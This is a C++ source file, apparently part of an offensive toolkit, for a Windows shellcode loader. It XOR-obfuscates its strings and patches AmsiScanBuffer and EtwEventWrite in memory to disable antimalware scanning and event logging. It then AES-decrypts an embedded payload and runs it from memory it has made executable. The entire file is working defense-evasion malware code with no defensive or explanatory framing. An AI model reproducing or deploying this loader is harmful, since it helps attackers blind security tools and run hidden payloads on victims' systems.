// netkit/evasion/loader.cpp — clean stub: AMSI/ETW patch, AES-256-CBC decrypt, exec.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <vector>
#include <cstring>
#include "payload.h"

#pragma comment(lib, "bcrypt.lib")

// compile-time XOR'd string, decoded on stack at runtime
template <size_t N>
struct ObfStr {
    char enc[N];
    constexpr ObfStr(const char(&s)[N]) : enc() {
        for (size_t i = 0; i < N; i++) enc[i] = (char)(s[i] ^ (0xA5 + (i & 7)));
    }
    void decode(char(&out)[N]) const {
        for (size_t i = 0; i < N; i++) out[i] = (char)(enc[i] ^ (0xA5 + (i & 7)));
    }
};

#define DECODE_STR(name, lit)                            \
    static constexpr ObfStr<sizeof(lit)> name##_o(lit);  \
    char name[sizeof(lit)];                              \
    name##_o.decode(name)

static void PatchAmsi() {
    DECODE_STR(dllName, "amsi.dll");
    DECODE_STR(procName, "AmsiScanBuffer");
    HMODULE amsi = LoadLibraryA(dllName);
    if (!amsi) return;
    void* target = (void*)GetProcAddress(amsi, procName);
    if (!target) return;
    // mov eax, 0x80070057 (E_INVALIDARG); ret  -> every scan reports "invalid"
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old = 0;
    if (VirtualProtect(target, sizeof patch, PAGE_EXECUTE_READWRITE, &old)) {
        memcpy(target, patch, sizeof patch);
        VirtualProtect(target, sizeof patch, old, &old);
    }
}

static void PatchEtw() {
    DECODE_STR(dllName, "ntdll.dll");
    DECODE_STR(procName, "EtwEventWrite");
    HMODULE ntdll = GetModuleHandleA(dllName);
    if (!ntdll) return;
    void* target = (void*)GetProcAddress(ntdll, procName);
    if (!target) return;
    BYTE patch[] = { 0xC3 };  // ret -> event never written
    DWORD old = 0;
    if (VirtualProtect(target, sizeof patch, PAGE_EXECUTE_READWRITE, &old)) {
        memcpy(target, patch, sizeof patch);
        VirtualProtect(target, sizeof patch, old, &old);
    }
}

static bool AesDecrypt(const BYTE* data, DWORD len, const BYTE* key, const BYTE* iv,
                       std::vector<BYTE>& out) {
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_KEY_HANDLE keyH = nullptr;
    bool ok = false;
    do {
        if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) break;
        if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                              sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) break;
        if (BCryptGenerateSymmetricKey(alg, &keyH, NULL, 0,
                                       (PUCHAR)key, 32, 0) != 0) break;
        std::vector<BYTE> ivCopy(iv, iv + 16);
        ULONG outLen = 0;
        if (BCryptDecrypt(keyH, (PUCHAR)data, len, ivCopy.data(), 16,
                          NULL, NULL, 0, &outLen, 0) != 0) break;
        out.resize(outLen);
        if (BCryptDecrypt(keyH, (PUCHAR)data, len, ivCopy.data(), 16,
                          NULL, out.data(), outLen, &outLen, 0) != 0) break;
        out.resize(outLen);
        if (out.empty()) break;
        BYTE pad = out.back();
        if (pad < 1 || pad > 16 || pad > out.size()) break;
        out.resize(out.size() - pad);
        ok = true;
    } while (false);
    if (keyH) BCryptDestroyKey(keyH);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    PatchAmsi();
    PatchEtw();

    std::vector<BYTE> sc;
    if (!AesDecrypt(G_PAYLOAD, G_PAYLOAD_LEN, G_KEY, G_IV, sc)) return 1;

    LPVOID mem = VirtualAlloc(NULL, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, sc.data(), sc.size());
    SecureZeroMemory(sc.data(), sc.size());

    DWORD old = 0;
    if (!VirtualProtect(mem, sc.size(), PAGE_EXECUTE_READ, &old)) return 1;

    ((void(*)())mem)();   // Donut spawns the payload thread and (with -x 3) blocks here
    Sleep(INFINITE);      // belt and braces: host must outlive the payload
    return 0;
}
